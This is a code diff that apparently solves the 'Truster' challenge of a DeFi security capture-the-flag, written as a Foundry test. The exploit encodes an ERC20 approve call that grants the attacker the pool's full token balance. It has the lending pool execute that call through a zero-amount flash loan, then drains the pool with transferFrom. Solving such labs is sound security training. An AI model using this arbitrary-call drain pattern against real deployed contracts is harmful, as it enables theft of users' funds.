@@ -37,6 +37,35 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        // Create the malicious bytes payload
+
+        bytes memory approveUserAttack = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(attacker),
+            dvt.balanceOf(address(trusterLenderPool))
+        );
+
+        trusterLenderPool.flashLoan(
+            0,
+            address(this),
+            address(dvt),
+            approveUserAttack
+        );
+
+        emit log_named_uint(
+            "(attacker) allowance after flashLoan ",
+            dvt.allowance(address(trusterLenderPool), address(attacker))
+        );
+
+        dvt.transferFrom(
+            address(trusterLenderPool),
+            address(attacker),
+            dvt.balanceOf(address(trusterLenderPool))
+        );
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
